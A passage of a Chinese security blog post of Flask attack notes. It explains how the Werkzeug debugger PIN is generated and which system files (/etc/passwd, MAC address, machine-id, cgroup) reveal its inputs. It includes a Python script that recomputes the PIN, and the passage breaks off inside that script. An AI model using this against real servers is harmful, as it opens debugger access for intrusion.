@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="有关flask攻击相关的简要笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask攻击相关笔记">
+<meta property="og:url" content="https://hasegawaazusa.github.io/flask-note.html">
+<meta property="og:site_name" content="独奏の小屋">
+<meta property="og:description" content="有关flask攻击相关的简要笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-27T08:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-08T03:30:14.043Z">
+<meta property="article:author" content="qsdz">
+<meta property="article:tag" content="flask">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://hasegawaazusa.github.io/flask-note.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hasegawaazusa.github.io/flask-note.html","path":"/flask-note.html","title":"flask攻击相关笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>flask攻击相关笔记 | 独奏の小屋</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">独奏の小屋</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">62</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">116</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#flask"><span class="nav-number">1.</span> <span class="nav-text">Flask</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ssti"><span class="nav-number">1.1.</span> <span class="nav-text">SSTI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pin-%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="nav-number">1.2.</span> <span class="nav-text">PIN 码计算</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="nav-number">1.2.3.</span> <span class="nav-text">信息获取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#username"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">username</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modname"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">modname</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#appname"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">appname</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#moddir"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">moddir</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mac"><span class="nav-number">1.2.3.5.</span> <span class="nav-text">mac</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#machine_id"><span class="nav-number">1.2.3.6.</span> <span class="nav-text">machine_id</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E4%BB%A3%E7%A0%81"><span class="nav-number">1.2.4.</span> <span class="nav-text">计算代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session-%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.</span> <span class="nav-text">session 构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">一些巧妙利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#secret_key"><span class="nav-number">1.4.1.</span> <span class="nav-text">SECRET_KEY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#os.path.join"><span class="nav-number">1.4.2.</span> <span class="nav-text">os.path.join()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.3.</span> <span class="nav-text">pickle 反序列化注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#opcode"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">opcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5-opcode"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">拼接 opcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">全局变量覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-number">1.4.3.5.</span> <span class="nav-text">函数执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#r"><span class="nav-number">1.4.3.5.1.</span> <span class="nav-text">R</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#i"><span class="nav-number">1.4.3.5.2.</span> <span class="nav-text">i</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#o"><span class="nav-number">1.4.3.5.3.</span> <span class="nav-text">o</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.4.3.6.</span> <span class="nav-text">实例化对象</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.4.4.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.4.5.</span> <span class="nav-text">yaml 反序列化</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="qsdz"
+      src="/images/android-chrome-144x144.png">
+  <p class="site-author-name" itemprop="name">qsdz</p>
+  <div class="site-description" itemprop="description">又菜又爱玩，望轻喷</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">116</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">62</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HasegawaAzusa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HasegawaAzusa" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hasegawaazusa.github.io/flask-note.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-144x144.png">
+      <meta itemprop="name" content="qsdz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="独奏の小屋">
+      <meta itemprop="description" content="又菜又爱玩，望轻喷">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="flask攻击相关笔记 | 独奏の小屋">
+      <meta itemprop="description" content="有关flask攻击相关的简要笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          flask攻击相关笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-27 16:00:00" itemprop="dateCreated datePublished" datetime="2023-08-27T16:00:00+08:00">2023-08-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-08 11:30:14" itemprop="dateModified" datetime="2023-09-08T11:30:14+08:00">2023-09-08</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">有关flask攻击相关的简要笔记</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="flask">Flask</h1>
+<h2 id="ssti">SSTI</h2>
+<p>Flask
+SSTI，即模板注入，旨在利用相关模板引擎的特点，通过沙箱逃逸等技术进行攻击服务，获取隐私信息。</p>
+<p><a href="/flask-ssti-note.html">点击这里</a>。</p>
+<h2 id="pin-码计算">PIN 码计算</h2>
+<h3 id="简介">简介</h3>
+<p>PIN是 Werkzeug（它是 Flask
+的依赖项之一）提供的额外安全措施，以防止在不知道 PIN
+的情况下访问调试器。</p>
+<p>调试器 PIN
+只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p>
+<p>Werkzeug 不同版本以及 Python 不同版本都会影响 PIN 码的生成。</p>
+<p>但是 PIN 码并不是随机生成，当我们重复运行同一程序时，生成的 PIN
+一样，PIN 码生成满足一定的生成算法。</p>
+<h3 id="源码分析">源码分析</h3>
+<p>Werkzeug 生成 PIN 码的核心代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>
+<p>其中 <code>rv</code> 为 PIN 码值。</p>
+<p>从代码中分析得知，PIN 码的组成由以下几部分组成：</p>
+<ul>
+<li><code>username</code>：通过 <code>getpass.getuser()</code>
+获取，是启动 Flask 的用户</li>
+<li><code>modname</code>：模块名，一般默认为 <code>flask.app</code></li>
+<li><code>appname</code>：通过
+<code>getattr(app, "__name__", type(app).__name__)</code> 获取，app
+名，一般默认为 <code>Flask</code></li>
+<li><code>moddir</code>：模块路径，flask目录下的一个 <code>app.py</code>
+的绝对路径</li>
+<li><code>mac</code>：通过 <code>str(uuid.getnode())</code>
+获取，当前网络的 MAC 地址的十进制数</li>
+<li><code>machine_id</code>：通过 <code>get_machine_id()</code>
+获取，<code>/etc/machine-id</code> 或者
+<code>/proc/sys/kernel/random/boot_i</code> 中的值</li>
+</ul>
+<h3 id="信息获取">信息获取</h3>
+<h4 id="username">username</h4>
+<p>一般通过读取 <code>/etc/passwd</code>
+文件寻找可能的用户进行爆破。</p>
+<h4 id="modname">modname</h4>
+<p>默认 <code>flask.app</code>。</p>
+<h4 id="appname">appname</h4>
+<p>默认为 <code>Flask</code>。</p>
+<h4 id="moddir">moddir</h4>
+<p>可以通过 DEBUG 模式下的报错信息获取。</p>
+<h4 id="mac">mac</h4>
+<p>读取 <code>/sys/class/net/eth0/address</code> 获取 MAC 的 16
+进制，然后转化为十进制即可。</p>
+<blockquote>
+<p>不一定是 <code>eth0</code>，可能需要尝试爆破。</p>
+</blockquote>
+<h4 id="machine_id">machine_id</h4>
+<p>在 Linux 平台下，为 <code>/etc/machine-id</code> 或者
+<code>/proc/sys/kernel/random/boot_i</code> 中的值</p>
+<p>在 Win 平台下，为注册表中
+<code>SOFTWARE\Microsoft\Cryptography</code> 的值。</p>
+<p>在 Docker 中，为 <code>/proc/self/cgroup</code> 的
+<code>docker</code> 行后的十六进制字符串，例如
+<code>1:name=systemd:/docker/4e2d4390ee2a9b57df253521f44301973efc74e35a300a02b4e509d60989543b</code>
+中的
+<code>4e2d4390ee2a9b57df253521f44301973efc74e35a300a02b4e509d60989543b</code>。</p>
+<h3 id="计算代码">计算代码</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">modname = <span class="string">&#x27;flask.app&#x27;</span></span><br><span class="line">appname = <span class="string">&#x27;Flask&#x27;</span></span><br><span class="line">moddir = <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span></span><br><span class="line">mac = <span class="string">&#x27;2485410340366&#x27;</span></span><br><span class="line">machine_id = <span class="string">&#x27;e7589bcf11d8b1f072f28454074a932798a86f05827bdbd7707b3c14f75e756c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params">username: <span class="built_in">str</span>, modname: <span class="built_in">str</span>, appname:<span class="built_in">str</span> , moddir:<span class="built_in">str</span> , mac: <span class="built_in">str</span>, machine_id: <span class="built_in">str</span>, high_version: <span class="built_in">bool</span>=<span class="literal">False</span></span>):</span><br><span class="line">    probably_public_bits = [username, modname, appname, moddir]</span><br><span class="line">    private_bits = [mac, machine_id]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> high_version:</span><br><span class="line">        h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span 